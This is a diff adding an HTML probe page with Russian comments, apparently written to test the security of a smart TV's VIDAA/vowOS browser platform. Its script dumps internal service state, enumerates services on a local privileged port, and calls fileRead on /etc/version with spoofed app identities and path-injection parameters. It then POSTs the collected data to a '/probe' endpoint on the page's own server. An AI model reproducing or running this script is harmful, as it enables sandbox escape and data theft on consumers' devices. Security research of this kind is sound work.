@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>tv identity probe</title>
+<style>
+ body{font:16px/1.3 sans-serif;background:#111;color:#eee;margin:0;padding:16px}
+ h1{font-size:18px;margin:0 0 8px}
+ #log{white-space:pre-wrap;font-family:monospace;font-size:12px}
+ .ok{color:#6f6}.bad{color:#f66}.dim{color:#888}.hit{color:#ff0}
+</style>
+</head>
+<body>
+<h1>идентичность приложения и службы <small class="dim">read-only</small></h1>
+<div id="log"></div>
+<script>
+/* fileRead склеивает путь с "undefined", fileWrite отбит appconfig.
+   Обе вещи зависят от идентичности вызывающего. Смотрим, что служба
+   о нас знает, и можно ли эту идентичность задать. */
+var API = "", out = { internals: {}, roots: [], services: [], appid: [], pkgs: [] };
+var MARK = "ZQAPP";
+
+function log(m, c) {
+  var el = document.getElementById("log"), d = document.createElement("div");
+  if (c) d.className = c; d.textContent = String(m).slice(0, 260); el.appendChild(d);
+}
+function post(p, o, cb) {
+  try { var x = new XMLHttpRequest(); x.open("POST", API + p, true);
+    x.setRequestHeader("Content-Type", "application/json");
+    x.onreadystatechange = function () { if (x.readyState === 4 && cb) cb(x.status); };
+    x.send(JSON.stringify(o)); } catch (e) { if (cb) cb(0); }
+}
+function call(api, args) {
+  try { return window.HiUtils_createRequest(api, args); }
+  catch (e) { return { thrown: String(e && e.message || e) }; }
+}
+function safe(fn) { try { var v = fn(); return (typeof v === "object") ? JSON.stringify(v).slice(0, 400) : String(v).slice(0, 400); } catch (e) { return "err:" + (e && e.message || e); } }
+function get(url, cb) {
+  try { var x = new XMLHttpRequest(); x.open("GET", url, true); x.timeout = 4000;
+    x.onload = function () { cb({ url: url, status: x.status, text: String(x.responseText || "").slice(0, 1200) }); };
+    x.onerror = function () { cb({ url: url, status: null, error: "onerror" }); };
+    x.ontimeout = function () { cb({ url: url, status: null, error: "timeout" }); };
+    x.send(); } catch (e) { cb({ url: url, status: null, error: String(e) }); }
+}
+
+/* ---------- 1. внутренности службы ---------- */
+out.internals = {
+  identifier: safe(function () { return window.vowOS.service.getIdentifier(); }),
+  session: safe(function () { return window.vowOS.service.session; }),
+  session_array: safe(function () { return window.vowOS.service.session_array; }),
+  port: safe(function () { return window.vowOS.service.port; }),
+  httpOption: safe(function () { return window.vowOS.service.httpOption; }),
+  msgs: safe(function () { return window.vowOS.service.msgs; }),
+  isObject: safe(function () { return window.vowOS.service.isObject; }),
+  location: safe(function () { return location.origin; }),
+  appVersion: safe(function () { return navigator.appVersion; })
+};
+for (var k in out.internals) log(k + " -> " + out.internals[k], "dim");
+
+/* ---------- 2. корни службы ---------- */
+var roots = ["https://localhost:9888/", "https://localhost:9888/service/",
+             "https://localhost:9888/service/pkgmgr", "https://localhost:9888/service/tvinfo"];
+var rDone = 0;
+roots.forEach(function (u) {
+  get(u, function (r) {
+    out.roots.push(r);
+    log("root " + u + " -> " + (r.status || r.error) + " " + String(r.text || "").slice(0, 120), r.status === 200 ? "hit" : "dim");
+    if (++rDone === roots.length) step3();
+  });
+});
+
+/* ---------- 3. другие имена служб ---------- */
+function step3() {
+  var NAMES = ["service","settings","setting","input","display","audio","video","power","account",
+    "store","appstore","net","network","wifi","bluetooth","dlna","dial","cec","tuner","epg","pvr",
+    "media","player","record","capture","screenshot","crash","update","usb","storage","cert","crypto",
+    "cli","dev","test","factory","hotel","tv","tvservice","hisense","vidaa","browser","webapp"];
+  var i = 0, found = [];
+  function next() {
+    if (i >= NAMES.length) { out.services = found; step4(); return; }
+    var n = NAMES[i++], url = "https://localhost:9888/service/" + n + "?api=getOSVersion&args=%22%22";
+    get(url, function (r) {
+      var ok = r.status === 200;
+      if (ok) { found.push({ name: n, text: String(r.text).slice(0, 200) }); log("HIT  /" + n + " -> " + String(r.text).slice(0, 120), "hit"); }
+      setTimeout(next, 30);
+    });
+  }
+  next();
+}
+
+/* ---------- 4. fileRead с идентичностью ---------- */
+function step4() {
+  var pkgs = [];
+  try {
+    var inst = window.vowOS.store.getInstalledPkgs();
+    if (inst && inst.ret && inst.msg) for (var j = 0; j < Math.min(inst.msg.length, 6); j++) pkgs.push(inst.msg[j].name);
+  } catch (e) {}
+  out.pkgs = pkgs;
+  var base = ["tv.vidaa.app.browser", "com.hisense.browser", "tv.vidaa.res.iot"];
+  for (var b = 0; b < base.length; b++) {
+    var r = call("fileRead", { path: "/etc/version", appId: base[b] });
+    out.appid.push({ key: "appId", value: base[b], result: JSON.stringify(r).slice(0, 200) });
+  }
+  var extra = [
+    ["pkg", "tv.vidaa.app.browser"], ["packageName", "tv.vidaa.app.browser"],
+    ["app", "tv.vidaa.app.browser"], ["id", "tv.vidaa.app.browser"],
+    ["session", 0], ["session", 1], ["appconfig", "tv.vidaa.app.browser"],
+    ["base", MARK + "/"], ["appPath", MARK + "/"], ["dataDir", MARK + "/"],
+    ["root", MARK + "/"], ["dir", MARK + "/"], ["path0", MARK + "/"]
+  ];
+  for (var e = 0; e < extra.length; e++) {
+    var o = { path: "/etc/version" }; o[extra[e][0]] = extra[e][1];
+    var rr = call("fileRead", o);
+    var s = JSON.stringify(rr).slice(0, 220);
+    out.appid.push({ key: extra[e][0], value: extra[e][1], result: s });
+    if (s.indexOf(MARK) >= 0) log("HIT  " + extra[e][0] + " -> " + s, "hit");
+  }
+  finish();
+}
+
+function finish() {
+  out.userAgent = navigator.userAgent;
+  post("/probe", Object.assign({ name: "identity" }, out), function (st) {
+    log(st === 200 ? "готово: отправлено" : "ошибка отправки " + st, st === 200 ? "ok" : "bad");
+  });
+}
+</script>
+</body>
+</html>
